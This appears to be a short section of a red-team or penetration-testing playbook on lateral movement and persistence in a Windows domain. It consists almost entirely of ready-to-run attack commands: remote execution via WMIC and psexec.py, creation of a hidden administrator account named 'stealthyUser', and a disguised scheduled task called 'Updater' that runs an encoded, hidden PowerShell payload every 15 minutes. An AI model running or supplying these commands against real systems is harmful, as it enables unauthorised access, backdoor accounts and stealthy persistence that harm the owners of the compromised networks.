# Phase 7: Lateral Movement and Persistence
Use Admin Shares:
```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```
### Create a hidden user (LOLBAS):
```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```
## Persist via Scheduled Task or Service:

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```
